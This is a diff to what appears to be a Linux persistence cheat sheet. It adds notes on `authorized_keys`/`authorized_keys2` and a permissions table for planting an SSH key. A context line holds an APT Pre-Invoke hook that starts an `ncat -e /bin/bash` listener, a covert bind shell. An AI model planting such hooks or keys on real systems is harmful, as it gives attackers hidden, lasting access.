@@ -237,12 +237,17 @@ echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &
 
 Add an SSH key into the `~/.ssh` folder.
 
+`~/.ssh/authorized_keys` is the standard file used by SSH to store public keys that are allowed to log in to the user account. Historically `authorized_keys` handled SSH protocol version 1 keys and `authorized_keys2` handled SSH protocol version 2 keys.
+
 1. Generate a new key with `ssh-keygen`
-2. Write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
+2. Write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys` or `~/.ssh/authorized_keys2`
 3. Set the right permission
 
-* 700 for `~/.ssh`
-* 600 for `authorized_keys`
+| Path/File                 | Recommended Permission | Description                                      |
+|---------------------------|------------------------|--------------------------------------------------|
+| `~/.ssh/`                 | `700`                  | Only the user can read/write/execute the folder  |
+| `~/.ssh/authorized_keys`  | `600`                  | Only the user can read/write the file            |
+| `~/.ssh/authorized_keys2` | `600`                  | Same as above; legacy/deprecated file            |
 
 ## Git Configuration
 
